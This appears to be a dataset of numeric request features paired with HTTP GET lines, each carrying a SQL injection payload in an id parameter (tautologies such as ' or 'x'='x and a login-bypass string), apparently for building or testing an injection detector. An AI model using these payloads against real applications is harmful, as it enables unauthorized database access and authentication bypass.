36,1,200,5876,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,3277,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,6610,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,5770,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,3813,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,1853,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,6649,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7516,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,1145,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,3063,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,5608,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,5756,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,5422,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7741,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7023,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,2046,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,2327,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7617,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,2429,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7238,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
20,2,200,2547,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,5729,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,3584,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,1564,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,1514,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,6173,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,6921,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,6177,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,3442,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,4211,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,3595,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,1273,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,4940,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,2695,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,4085,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,3363,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,2552,7,2,6,1,1,GET ?id='&' HTTP/1.1
28,1,200,4761,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5886,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5207,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4829,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7874,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1507,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6771,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5806,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6755,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7342,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4915,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7480,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5751,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6352,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6711,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2093,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6894,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3209,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7285,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7739,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4645,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5979,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7267,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7568,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4932,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3412,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5944,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7205,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4967,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4787,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2388,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2501,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3323,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6702,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3457,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1553,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4059,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2841,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3826,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1042,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,4570,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,6842,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5421,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7309,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5454,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2209,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2769,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7518,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,5877,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1262,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,7403,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1529,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3903,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
32,1,200,3093,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,3956,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,1900,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,5664,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,5944,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,2142,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,1285,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,7551,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,1412,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,1770,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,5769,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,6348,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,3277,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,6921,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
32,1,200,4051,7,5,7,1,1,GET ?id=1′) and '1′='1– HTTP/1.1
37,1,200,2601,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,1434,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,3040,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,7230,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,4015,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,2891,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,6109,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,6418,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,6916,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,7541,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,5105,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,5294,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,5244,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,2080,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,7041,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,1209,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,5405,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,5019,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,2078,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,2258,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
37,1,200,7103,7,9,7,1,1,GET ?id=admin") or "1"="1"-- HTTP/1.1
30,1,200,2030,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4139,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6457,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6694,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4793,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4823,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,1053,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4253,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,2254,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6612,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6904,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6895,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,1960,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4722,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,6396,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,5420,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4921,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,7952,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,3114,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,5313,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4338,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,2949,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
44,1,200,3813,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,4275,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7004,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3142,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,5381,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,2167,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
